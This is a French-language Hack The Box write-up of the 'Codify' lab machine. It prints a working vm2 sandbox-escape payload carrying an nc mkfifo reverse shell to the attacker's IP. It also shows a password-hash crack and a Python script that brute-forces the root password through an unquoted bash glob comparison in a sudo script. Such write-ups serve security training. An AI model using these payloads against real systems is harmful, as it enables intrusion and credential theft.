<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D;--font-size:17.5px}</style><title>HTB: Codify</title>
<meta name=description content="Platforme: Hack The Box Lien: Codify Niveau: Facile OS: Linux Codify démarre avec une application web offrant un environnement sandbox pour tester son code …"><meta name=keywords content="HackTheBox"><meta property="og:url" content="https://scorpiosec.com/fr/posts/htb-codify/"><meta property="og:type" content="website"><meta property="og:title" content="HTB: Codify"><meta property="og:description" content="Platforme: Hack The Box Lien: Codify Niveau: Facile OS: Linux Codify démarre avec une application web offrant un environnement sandbox pour tester son code …"><meta property="og:image" content="https://scorpiosec.com/images/HTB-Codify/Codify.png"><meta property="og:image:secure_url" content="https://scorpiosec.com/images/HTB-Codify/Codify.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="HTB: Codify"><meta name=twitter:description content="Platforme: Hack The Box Lien: Codify Niveau: Facile OS: Linux Codify démarre avec une application web offrant un environnement sandbox pour tester son code …"><meta property="twitter:domain" content="https://scorpiosec.com/fr/posts/htb-codify/"><meta property="twitter:url" content="https://scorpiosec.com/fr/posts/htb-codify/"><meta name=twitter:image content="https://scorpiosec.com/images/HTB-Codify/Codify.png"><link rel=canonical href=https://scorpiosec.com/fr/posts/htb-codify/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.dbdc9b4541e086f12258f5155a48310ed9f06d931aacfe9b7c85f8699b1f5cb2.js integrity="sha256-29ybRUHghvEiWPUVWkgxDtnwbZMarP6bfIX4aZsfXLI="></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://scorpiosec.com/><img src=/redscorpio.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://scorpiosec.com/>Scorpiosec</a></div><div class=nav-links><div class=nav-link><a href=https://scorpiosec.com/fr/posts/ aria-label=posts><span data-feather=book></span> Postes</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/projects/ aria-label=projects><span data-feather=code></span> Projets</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/tags/ aria-label=tags><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/categories/ aria-label=categories><span data-feather=folder></span> Catégories</a></div><div class=nav-link><a href=https://scorpiosec.com/ aria-label></a></div><div class="nav-link language-switcher"><a href=/posts/htb-codify/>English</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a aria-hidden=true role=switch><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
<a aria-checked=false aria-labelledby=hamburger-menu-toggle id=hamburger-menu-toggle-target role=switch><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://scorpiosec.com/fr/posts/><span data-feather=book></span> Postes</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/projects/><span data-feather=code></span> Projets</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/categories/><span data-feather=folder></span> Catégories</a></li><li class=nav-item><a href=https://scorpiosec.com/></a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a role=switch><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>HTB: Codify</h1><small role=doc-subtitle></small><p class=post-date>7 min read |
<span class=post-date>5 Avril 2024</span></p><ul class=post-tags><li class=post-tag><a href=https://scorpiosec.com/fr/tags/hackthebox>HackTheBox</a></li></ul></div><div class=post-content><ul><li>Platforme: Hack The Box</li><li>Lien: <a href=https://app.hackthebox.com/machines/Codify>Codify</a></li><li>Niveau: Facile</li><li>OS: Linux</li></ul><hr><p>Codify démarre avec une application web offrant un environnement sandbox pour tester son code Node.js. Elle utilise <a href=https://github.com/patriksimek/vm2/releases/tag/3.9.16>vm2</a> et emploie une liste blanche de modules. Cependant, il existe une vulnérabilité (<a href=https://nvd.nist.gov/vuln/detail/CVE-2023-32314>CVE-2023-3214</a>) avec vm2 qui peut être exploitée pour sortir du sandbox et accéder au système cible. Un mouvement latéral permet ensuite d&rsquo;accéder à un autre compte utilisateur et d&rsquo; obtenir le drapeau <code>user.txt</code>. De plus, après avoir identifié une vulnérabilité dans un script que nous pouvons exécuter avec des privilèges élevés, une attaque par force brute est utilisée pour obtenir le mot de passe de l&rsquo;utilisateur root.</p><p>Adresse IP cible - <code>10.10.11.239</code></p><h2 id=scanning>Scanning</h2><pre tabindex=0><code>nmap -sC -sV -oA nmap/Codify 10.10.11.239
</code></pre><p><strong>Results</strong></p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#56b6c2>(</span> https://nmap.org <span style=color:#56b6c2>)</span> at 2024-03-21 20:19 CDT
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> 10.10.11.239
</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.051s latency<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#d19a66>997</span> closed tcp ports <span style=color:#56b6c2>(</span>conn-refused<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>PORT     STATE SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 <span style=color:#56b6c2>(</span>Ubuntu Linux; protocol 2.0<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   <span style=color:#d19a66>256</span> 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b <span style=color:#56b6c2>(</span>ECDSA<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#d19a66>256</span> 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce <span style=color:#56b6c2>(</span>ED25519<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>80/tcp   open  http    Apache httpd 2.4.52
</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.52 <span style=color:#56b6c2>(</span>Ubuntu<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_http-title: Did not follow redirect to http://codify.htb/
</span></span><span style=display:flex><span>3000/tcp open  http    Node.js Express framework
</span></span><span style=display:flex><span>|_http-title: Codify
</span></span><span style=display:flex><span>Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#c678dd>done</span>: <span style=color:#d19a66>1</span> IP address <span style=color:#56b6c2>(</span><span style=color:#d19a66>1</span> host up<span style=color:#56b6c2>)</span> scanned in 14.83 seconds
</span></span></code></pre></div><p>Nous identifions trois ports ouverts : 22 (SSH), 80 (HTTP) et 3000 (Node.js). Nous sommes redirigés vers <code>codify.htb</code> que j&rsquo;ai ajouté à <code>/etc/hosts</code>.</p><pre tabindex=0><code>sudo echo &#34;10.10.11.239 codify.htb&#34; | sudo tee -a /etc/hosts
</code></pre><h2 id=enumération>Enumération</h2><p>Le site web est un service permettant de tester des codes Node.js dans un environnement sandbox.</p><p><img src=/images/HTB-Codify/codify-website.png alt="Codify Website"></p><p>En cliquant sur <code>Try it now</code>, un éditeur s&rsquo;affiche, dans lequel le code peut être exécuté.</p><p><img src=/images/HTB-Codify/code-run.png alt="Codify Sanbox Environment"></p><p>La plateforme utilise une liste blanche de modules pour des raisons de sécurité.</p><p><img src=/images/HTB-Codify/codify-limitations.png alt="Codify Module Whitelist"></p><p>Dans la section &ldquo;About Us&rdquo;, nous apprenons que la bibliothèque <a href=https://github.com/patriksimek/vm2/releases/tag/3.9.16>vm2</a> est utilisée.</p><p><img src=/images/HTB-Codify/codify-about.png alt="Codify About Section"></p><h2 id=accès-initial>Accès Initial</h2><p>En recherchant les vulnérabilités de vm2, nous trouvons <a href=https://nvd.nist.gov/vuln/detail/CVE-2023-32314>CVE-2023-3214</a> et un PoC peut être trouvé <a href=https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac>ici</a>. Ce programme nous permet d&rsquo;échapper au sandbox et d&rsquo;obtenir l&rsquo;exécution de code à distance (RCE).</p><p>Après de multiples échecs, la recherche d&rsquo;un reverse shell me mène à <a href="https://www.youtube.com/watch?v=_q_ZCy-hEqg&amp;ab_channel=0xdf">cette</a> vidéo de 0xdf où il explique les reverse shell <code>mkfifo</code>. Quelques reverse shells mkfifo sont disponibles <a href=https://www.oreilly.com/library/view/hands-on-red-team/9781788995238/b76e6441-5999-45e4-949e-bd332cb21cce.xhtml>ici</a> et le premier finit par fonctionner. Voici le code complet.</p><blockquote><p>N&rsquo;oubliez pas de modifier l&rsquo;adresse IP et le numéro de port.</p></blockquote><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-Javascript data-lang=Javascript><span style=display:flex><span><span style=color:#c678dd>const</span> { <span style=color:#e06c75>VM</span> } <span style=color:#56b6c2>=</span> <span style=color:#e06c75>require</span>(<span style=color:#98c379>&#34;vm2&#34;</span>);
</span></span><span style=display:flex><span><span style=color:#c678dd>const</span> <span style=color:#e06c75>vm</span> <span style=color:#56b6c2>=</span> <span style=color:#c678dd>new</span> <span style=color:#e06c75>VM</span>();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>const</span> <span style=color:#e06c75>code</span> <span style=color:#56b6c2>=</span> <span style=color:#98c379>`
</span></span></span><span style=display:flex><span><span style=color:#98c379>  const err = new Error();
</span></span></span><span style=display:flex><span><span style=color:#98c379>  err.name = {
</span></span></span><span style=display:flex><span><span style=color:#98c379>    toString: new Proxy(() =&gt; &#34;&#34;, {
</span></span></span><span style=display:flex><span><span style=color:#98c379>      apply(target, thiz, args) {
</span></span></span><span style=display:flex><span><span style=color:#98c379>        const process = args.constructor.constructor(&#34;return process&#34;)();
</span></span></span><span style=display:flex><span><span style=color:#98c379>        throw process.mainModule.require(&#34;child_process&#34;).execSync(&#34;rm -f /tmp/a; mkfifo /tmp/a; nc 10.10.14.13 9001 0&lt;/tmp/a | /bin/sh &gt;/tmp/a 2&gt;&amp;1; rm /tmp/a &#34;).toString();
</span></span></span><span style=display:flex><span><span style=color:#98c379>      },
</span></span></span><span style=display:flex><span><span style=color:#98c379>    }),
</span></span></span><span style=display:flex><span><span style=color:#98c379>  };
</span></span></span><span style=display:flex><span><span style=color:#98c379>  try {
</span></span></span><span style=display:flex><span><span style=color:#98c379>    err.stack;
</span></span></span><span style=display:flex><span><span style=color:#98c379>  } catch (stdout) {
</span></span></span><span style=display:flex><span><span style=color:#98c379>    stdout;
</span></span></span><span style=display:flex><span><span style=color:#98c379>  }
</span></span></span><span style=display:flex><span><span style=color:#98c379>`</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e06c75>console</span>.<span style=color:#e06c75>log</span>(<span style=color:#e06c75>vm</span>.<span style=color:#e06c75>run</span>(<span style=color:#e06c75>code</span>));
</span></span></code></pre></div><p>L&rsquo;accès initial est obtenu après avoir exécuté le code dans l&rsquo;éditeur.</p><p><img src=/images/HTB-Codify/foothold.png alt="Codify Foothold"></p><p>Le shell peut être amélioré en exécutant les commandes ci-dessous.</p><pre tabindex=0><code>python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;  
export TERM=xterm  
ctrl + z  
stty raw -echo; fg
stty rows 38 columns 116
</code></pre><h3 id=mouvement-latéral-shell-en-tant-que-joshua>Mouvement latéral (shell en tant que joshua)</h3><p>L&rsquo;accès au dossier <code>joshua</code> dans <code>/home</code> est bloqué. Il appartient à l&rsquo;utilisateur <code>joshua</code> qui est notre cible pour le mouvement latéral.</p><p><img src=/images/HTB-Codify/access-denied.png alt="Access to Joshua directory denied"></p><p>Après avoir exécuté <code>linpeas</code> sur la cible, quelques fichiers accessibles intéressants sont trouvés dans le répertoire racine d&rsquo;Apache.</p><p><img src=/images/HTB-Codify/Codify-intersting-files.png alt="Files found by linpeas"></p><p>Le fichier <code>tickets.db</code> dans <code>/var/www/contact</code> contient le hash du mot de passe de l&rsquo;utilisateur <code>joshua</code>.</p><p><img src=/images/HTB-Codify/pwd-hash.png alt="User josua password hash"></p><p><code>hashid</code> révèle qu&rsquo;il s&rsquo;agit d&rsquo;un hash Blowfish.</p><p><img src=/images/HTB-Codify/hashid.png alt="Hashid command results"></p><p>En utilisant john pour craquer le hash, le mot de passe <code>spongebob1</code> est récupéré.</p><p><img src=/images/HTB-Codify/hash-cracked.png alt="User Joshua password"></p><p>Avec les identifiants <code>joshua:spongebob1</code> nous pouvons nous connecter via SSH et obtenir le drapeau <code>user.txt</code></p><h2 id=elévation-de-privilèges-shell-en-tant-que-root>Elévation de Privilèges (shell en tant que root)</h2><p>La commande <code>sudo -l</code> révèle que l&rsquo;utilisateur <code>joshua</code> peut exécuter le script <code>mysql-backup.sh</code> en tant que root.</p><p><img src=/images/HTB-Codify/sudo-l.png alt="Sudo -l command results"></p><p>Lorsque nous essayons d&rsquo;exécuter le script, nous obtenons le message <code>Enter MySQL password for root:</code>.</p><p>Voici le contenu du script</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#7f848e>#!/bin/bash
</span></span></span><span style=display:flex><span><span style=color:#7f848e></span><span style=color:#e06c75>DB_USER</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;root&#34;</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>DB_PASS</span><span style=color:#56b6c2>=</span><span style=color:#c678dd>$(</span>/usr/bin/cat /root/.creds<span style=color:#c678dd>)</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>BACKUP_DIR</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;/var/backups/mysql&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e5c07b>read</span> -s -p <span style=color:#98c379>&#34;Enter MySQL password for </span><span style=color:#e06c75>$DB_USER</span><span style=color:#98c379>: &#34;</span> USER_PASS
</span></span><span style=display:flex><span>/usr/bin/echo
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>if</span> <span style=color:#56b6c2>[[</span> <span style=color:#e06c75>$DB_PASS</span> <span style=color:#56b6c2>==</span> <span style=color:#e06c75>$USER_PASS</span> <span style=color:#56b6c2>]]</span>; <span style=color:#c678dd>then</span>
</span></span><span style=display:flex><span>        /usr/bin/echo <span style=color:#98c379>&#34;Password confirmed!&#34;</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>else</span>
</span></span><span style=display:flex><span>        /usr/bin/echo <span style=color:#98c379>&#34;Password confirmation failed!&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>exit</span> <span style=color:#d19a66>1</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>fi</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>/usr/bin/mkdir -p <span style=color:#98c379>&#34;</span><span style=color:#e06c75>$BACKUP_DIR</span><span style=color:#98c379>&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e06c75>databases</span><span style=color:#56b6c2>=</span><span style=color:#c678dd>$(</span>/usr/bin/mysql -u <span style=color:#98c379>&#34;</span><span style=color:#e06c75>$DB_USER</span><span style=color:#98c379>&#34;</span> -h 0.0.0.0 -P <span style=color:#d19a66>3306</span> -p<span style=color:#98c379>&#34;</span><span style=color:#e06c75>$DB_PASS</span><span style=color:#98c379>&#34;</span> -e <span style=color:#98c379>&#34;SHOW DATABASES;&#34;</span> | /usr/bin/grep -Ev <span style=color:#98c379>&#34;(Database|information_schema|performance_schema)&#34;</span><span style=color:#c678dd>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>for</span> db in <span style=color:#e06c75>$databases</span>; <span style=color:#c678dd>do</span>
</span></span><span style=display:flex><span>    /usr/bin/echo <span style=color:#98c379>&#34;Backing up database: </span><span style=color:#e06c75>$db</span><span style=color:#98c379>&#34;</span>
</span></span><span style=display:flex><span>    /usr/bin/mysqldump --force -u <span style=color:#98c379>&#34;</span><span style=color:#e06c75>$DB_USER</span><span style=color:#98c379>&#34;</span> -h 0.0.0.0 -P <span style=color:#d19a66>3306</span> -p<span style=color:#98c379>&#34;</span><span style=color:#e06c75>$DB_PASS</span><span style=color:#98c379>&#34;</span> <span style=color:#98c379>&#34;</span><span style=color:#e06c75>$db</span><span style=color:#98c379>&#34;</span> | /usr/bin/gzip &gt; <span style=color:#98c379>&#34;</span><span style=color:#e06c75>$BACKUP_DIR</span><span style=color:#98c379>/</span><span style=color:#e06c75>$db</span><span style=color:#98c379>.sql.gz&#34;</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>done</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>/usr/bin/echo <span style=color:#98c379>&#34;All databases backed up successfully!&#34;</span>
</span></span><span style=display:flex><span>/usr/bin/echo <span style=color:#98c379>&#34;Changing the permissions&#34;</span>
</span></span><span style=display:flex><span>/usr/bin/chown root:sys-adm <span style=color:#98c379>&#34;</span><span style=color:#e06c75>$BACKUP_DIR</span><span style=color:#98c379>&#34;</span>
</span></span><span style=display:flex><span>/usr/bin/chmod <span style=color:#d19a66>774</span> -R <span style=color:#98c379>&#34;</span><span style=color:#e06c75>$BACKUP_DIR</span><span style=color:#98c379>&#34;</span>
</span></span><span style=display:flex><span>/usr/bin/echo <span style=color:#98c379>&#39;Done!&#39;</span>
</span></span></code></pre></div><p>L&rsquo;image ci-dessous identifie la vulnérabilité du script. Avec Bash, lorsque la partie droite de l&rsquo;opérateur <code>==</code> d&rsquo;une expression conditionnelle (entre doubles crochets <code>[[ ... ]]</code>) n&rsquo;est pas placée entre guillemets, Bash effectue un &ldquo;pattern matching&rdquo; (également appelé &ldquo;globbing&rdquo;) au lieu de l&rsquo;interpréter comme une chaîne de caractères.</p><p><img src=/images/HTB-Codify/script-vulnerability.png alt="mysql-backup.sh script vulnerability"></p><p>Par exemple, si le mot de passe est <code>hello</code>, <code>[[$DB_PASS == hello]]</code> et <code>[[$DB_PASS == h*]]</code> fonctionneront tous les deux car <code>h*</code> est un &ldquo;pattern&rdquo; qui correspond à n&rsquo;importe quelle chaîne commençant par la lettre <code>h</code>. Sachant cela, une attaque par force brute du mot de passe devient une solution viable.</p><blockquote><p>Pour résoudre ce problème, vous devez mettre entre guillemets la variable <code>$USER_PASS</code> dans la comparaison, comme suit : <code>if [[ $DB_PASS == "$USER_PASS" ]] ; then</code>. Cela garantit que la valeur de <code>$USER_PASS</code> est traitée comme une chaîne de caractères, et non comme un motif.</p></blockquote><p>Voici le script Python que j&rsquo;ai utilisé</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-Python data-lang=Python><span style=display:flex><span><span style=color:#c678dd>import</span> <span style=color:#e06c75>string</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>import</span> <span style=color:#e06c75>os</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e06c75>chars</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>string</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>ascii_letters</span> <span style=color:#56b6c2>+</span> <span style=color:#e06c75>string</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>digits</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>password</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#39;&#39;</span>
</span></span><span style=display:flex><span><span style=color:#e5c07b>next</span><span style=color:#56b6c2>=</span><span style=color:#d19a66>1</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e5c07b>print</span>(<span style=color:#98c379>&#34;[+] initializing bruteforce script...&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#e5c07b>print</span>(<span style=color:#98c379>&#34;[+] bruteforce in progress, please wait...&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#c678dd>while</span> <span style=color:#e5c07b>next</span><span style=color:#56b6c2>==</span><span style=color:#d19a66>1</span>:
</span></span><span style=display:flex><span>        <span style=color:#c678dd>for</span> <span style=color:#e06c75>i</span> <span style=color:#56b6c2>in</span> <span style=color:#e06c75>chars</span>:
</span></span><span style=display:flex><span>                <span style=color:#e06c75>errorlevel</span><span style=color:#56b6c2>=</span><span style=color:#e06c75>os</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>system</span>(<span style=color:#98c379>&#34;echo &#34;</span><span style=color:#56b6c2>+</span><span style=color:#e06c75>password</span><span style=color:#56b6c2>+</span><span style=color:#e06c75>i</span><span style=color:#56b6c2>+</span><span style=color:#98c379>&#34;* | sudo /opt/scripts/mysql-backup.sh &gt;/dev/null 2&gt;&amp;1&#34;</span>)
</span></span><span style=display:flex><span>                <span style=color:#c678dd>if</span> <span style=color:#e06c75>errorlevel</span><span style=color:#56b6c2>==</span><span style=color:#d19a66>0</span>:
</span></span><span style=display:flex><span>                        <span style=color:#e06c75>password</span><span style=color:#56b6c2>=</span><span style=color:#e06c75>password</span><span style=color:#56b6c2>+</span><span style=color:#e06c75>i</span>
</span></span><span style=display:flex><span>                        <span style=color:#e5c07b>print</span>(<span style=color:#98c379>&#34;[+] new character found: &#34;</span><span style=color:#56b6c2>+</span><span style=color:#e06c75>password</span>)
</span></span><span style=display:flex><span>                        <span style=color:#e5c07b>next</span><span style=color:#56b6c2>=</span><span style=color:#d19a66>1</span>
</span></span><span style=display:flex><span>                        <span style=color:#c678dd>break</span>
</span></span><span style=display:flex><span>                <span style=color:#c678dd>else</span>: <span style=color:#e5c07b>next</span><span style=color:#56b6c2>=</span><span style=color:#d19a66>0</span>
</span></span><span style=display:flex><span><span style=color:#e5c07b>print</span>(<span style=color:#98c379>&#34;[+] process terminated, root password is: &#34;</span><span style=color:#56b6c2>+</span><span style=color:#e06c75>password</span>)
</span></span></code></pre></div><p>Voici comment le script fonctionne:</p><ol><li><p>Il importe les modules nécessaires : <code>string</code> pour les ensembles de caractères et <code>os</code> pour l&rsquo;exécution des commandes système.</p></li><li><p>Il définit un ensemble de caractères <code>chars</code> qui inclut toutes les lettres ASCII (minuscules et majuscules) et les chiffres.</p></li><li><p>Un mot de passe vide est initialisé pour stocker les caractères du mot de passe découvert, et un drapeau (<code>next</code>) pour contrôler la boucle.</p></li><li><p>Il commence une boucle <code>while</code> qui continue tant que <code>next</code> est égal à 1. A l&rsquo;intérieur de cette boucle :</p><ul><li>Il itère sur chaque caractère <code>i</code> dans <code>chars</code>.</li></ul></li></ol><ul><li>Pour chaque caractère, il construit une commande qui renvoie le mot de passe actuel plus le caractère <code>i</code>, suivi d&rsquo;un wildcard <code>*</code>, et l&rsquo;envoie à <code>sudo /opt/scripts/mysql-backup.sh</code>. La commande est exécutée dans un shell et son résultat est redirigé vers /dev/null pour le supprimer.<ul><li>Si la commande réussit (c&rsquo;est-à-dire que le statut de sortie <code>errorlevel</code> est <code>0</code>), cela signifie que le <code>password</code> actuel plus le caractère <code>i</code> est un préfixe du mot de passe actuel. Dans ce cas, il ajoute <code>i</code> au mot de passe, affiche un message sur la console, et met <code>next</code> à <code>1</code> pour continuer la boucle.</li></ul></li><li>Si la commande échoue (c&rsquo;est-à-dire que le statut de sortie <code>errorlevel</code> est différent de zéro), cela signifie que le <code>password</code> actuel plus le caractère <code>i</code> n&rsquo;est pas un préfixe du mot de passe actuel. Dans ce cas, il met <code>next</code> à <code>0</code> pour arrêter la boucle après l&rsquo;itération en cours.</li></ul><ol start=5><li>Une fois la boucle terminée, un message est affiché sur la console indiquant que le processus est terminé et le mot de passe découvert est affiché.</li></ol><p>Après l&rsquo;exécution du script, le mot de passe root s&rsquo;avère être <code>kljh12k3jhaskjh12kjh3</code>.</p><p><img src=/images/HTB-Codify/root-pwd.png alt="mysql-backup.sh script vulnerability"></p><p>Le mot de passe est utilisé pour accéder au compte <code>root</code> et le drapeau <code>root.txt</code> se trouve dans <code>/root</code>.</p><p><img src=/images/HTB-Codify/root-flag.png alt="mysql-backup.sh script vulnerability"></p><p>La connaissance de Bash était indispensable pour comprendre la vulnérabilité du script. En tant que professionnel dans le domaine de la sécurité informatique, il est toujours utile d&rsquo;avoir des connaissances en matière de scripting/programmation en Bash et en Python.</p><p>Si vous cherchez des ressources, freeCodeCamp propose un <a href="https://www.youtube.com/watch?v=tK9Oc6AEnR4&amp;t=18s&amp;ab_channel=freeCodeCamp.org">tutoriel</a> pour Bash pour les débutants sur leur chaîne YouTube. Si vous préférez les livres, je vous recommande <a href=https://www.amazon.com/Learning-bash-Shell-Programming-Nutshell/dp/0596009658>Learning the bash Shell, 3rd Edition</a> et <a href=https://www.amazon.com/Linux-Command-Line-2nd-Introduction/dp/1593279523>The Linux Command Line, 2nd Edition : A Complete Introduction</a>.</p></div><div class=prev-next><div class=prev-post><p><a href=/fr/posts/htb-analytics/>&#8592;
Précédent:
HTB: Analytics</a></p><p class=prev-post-date>mars 23, 2024</p></div><div class=next-post><p><a href=/fr/posts/thm-clocky/>Suivant:
THM: Clocky
&#8594;</a></p><p class=next-post-date>avril 10, 2024</p></div></div><svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><ul><li><a href=#scanning>Scanning</a></li><li><a href=#enumération>Enumération</a></li><li><a href=#accès-initial>Accès Initial</a><ul><li><a href=#mouvement-latéral-shell-en-tant-que-joshua>Mouvement latéral (shell en tant que joshua)</a></li></ul></li><li><a href=#elévation-de-privilèges-shell-en-tant-que-root>Elévation de Privilèges (shell en tant que root)</a></li></ul></li></ul></nav></nav></aside></main><footer class=footer><span>&copy; 2024 K-Scorpio</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/gokarna-theme/gokarna-hugo>Gokarna</a></span></footer></body></html>